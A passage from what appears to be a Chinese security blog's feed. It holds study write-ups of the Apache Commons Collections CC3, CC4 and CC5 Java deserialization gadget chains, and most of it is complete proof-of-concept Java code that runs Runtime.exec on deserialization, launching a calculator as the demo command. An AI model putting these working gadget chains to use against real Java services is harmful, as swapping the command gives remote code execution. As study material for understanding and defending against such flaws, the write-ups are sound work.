tiedMapEntry.toString();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功触发计算器。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/4.png"></p><p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发<code>toString</code>从而触发命令的执行。</p><p>从<code>Gadget chain</code>可以看到yso的作者是利用<code>BadAttributeValueExpException.readObject()</code>来达到以上目的的。</p><p>跟进这个类进行查看：发现get函数获取 val 的值然后赋给<code>valObj</code>，然后在符合 第二个<code>else if</code> 的情况下就会调用 <code>toString</code>。<code>val</code> 可以通过反射修改 ，同时 <code>System.getSecurityManager() </code>返回值也默认为 null ，这样我们就可以进入 else if 从而触发代码了。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/5.png"></p><h1 id="4-反序列化利用链POC"><a href="#4-反序列化利用链POC" class="headerlink" title="4.反序列化利用链POC"></a>4.反序列化利用链POC</h1><p>根据上面的分析，构造POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> String[] &#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outtermap,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();</span><br>        BadAttributeValueExpException poc = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-number">1</span>);<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(poc,tiedMapEntry);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(poc);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功触发：</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;学习&lt;code&gt;CommonsCollections1&lt;/code&gt;之后，我们知道该利用链是通过&lt;code&gt;sun.refl</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections4利用链分析学习</title>
    <link href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-17T06:21:28.000Z</published>
    <updated>2021-05-17T07:37:46.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在查看<code>ysoserial</code>里面的CommonsCollections4的利用链后，我个人感觉它是cc2链和cc3链的结合。</p><h1 id="2-利用链限制条件"><a href="#2-利用链限制条件" class="headerlink" title="2.利用链限制条件"></a>2.利用链限制条件</h1><h4 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h4><p>CommonsCollections 4.0</p><h4 id="JDK限制"><a href="#JDK限制" class="headerlink" title="JDK限制"></a>JDK限制</h4><p>JDK版本：暂无限制</p><h1 id="3-利用链构造"><a href="#3-利用链构造" class="headerlink" title="3.利用链构造"></a>3.利用链构造</h1><p>​    该利用链沿用了CC3链利用<code>TrAXFilter</code>类的构造函数去触发<code>TemplatesImpl#newTransformer</code>加载恶意字节码的方法，沿用了CC2链通过<code>PriorityQueue</code>触发<code>TransformingComparator.compare()</code>进而调用传入的<code>transformer</code>对象的<code>transform</code>方法。</p><p>POC:</p><p>该POC是我根据cc2和cc3链组合起来的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;CC4Evil&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetbyte = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = templates.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecodes = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(templates,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecodes.set(templates,targetbyte);<br>        _tfactory.set(templates,<span class="hljs-keyword">null</span>);<br><br>        Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        Class clazz1 = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field comparator = clazz1.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br>        <span class="hljs-keyword">try</span> &#123;<br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>            objectOutputStream.writeObject(priorityQueue);<br>            objectOutputStream.close();<br><br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>            objectInputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在查看&lt;code&gt;ysoserial&lt;/code&gt;里面的CommonsCollections4的利用链后，我个人感</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections3链分析学习</title>
    <link href="https://reader-l.github.io/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-16T07:07:38.000Z</published>
    <updated>2021-05-17T06:22:21.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    这篇文章是基于phith0n师傅在代码审计星球里的《Java安全漫谈系列》的第十四篇的文章来进行学习的。</p><h1 id="2-限制版本"><a href="#2-限制版本" class="headerlink" title="2.限制版本"></a>2.限制版本</h1><p><code>CommonsCollections 3.1 - 3.2.1</code></p><h1 id="3-限制的JDK版本"><a href="#3-限制的JDK版本" class="headerlink" title="3.限制的JDK版本"></a>3.限制的JDK版本</h1><p><code>JDK版本：1.7 （8u71之后已修复不可利用）</code></p><h1 id="4-分析"><a href="#4-分析" class="headerlink" title="4.分析"></a>4.分析</h1><p><code>CommonsCollections3</code>链其实是<code>CommonsCollections1</code>链和<code>CommonsCollections2</code>链的结合，为什么这样说呢？</p><p>往下看：以下是CC1链的核心代码和CC2中的核心代码</p><p>采用<code>TransformedMap</code>触发命令执行的CC1核心部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_cc1part</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC2中利用<code>TemplatesImpl</code>加载字节码的部分代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_cc2part</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass =  pool.makeClass(<span class="hljs-string">&quot;EvilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>尝试将这两部分组合起来，组成一个新的调用方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException, TransformerConfigurationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        <span class="hljs-comment">//参考cc1的简化Demo，调用newTransformer</span><br>        Transformer[] transform = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(obj),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transform);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = TransformedMap.decorate(innermap,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        outermap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br><span class="hljs-comment">//        obj.newTransformer();</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/2.png"></p><p>但是查看<code>ysoserial</code>工具的<code>cc3</code>利用链，我们可以发现该工具并不是利用这种方式。</p><p>原因如下：</p><p>​    2015年初，<code>@frohoff</code>和<code>@gebl</code>发布了Talk《Marshalling Pickles: how deserializing objects will ruinyour 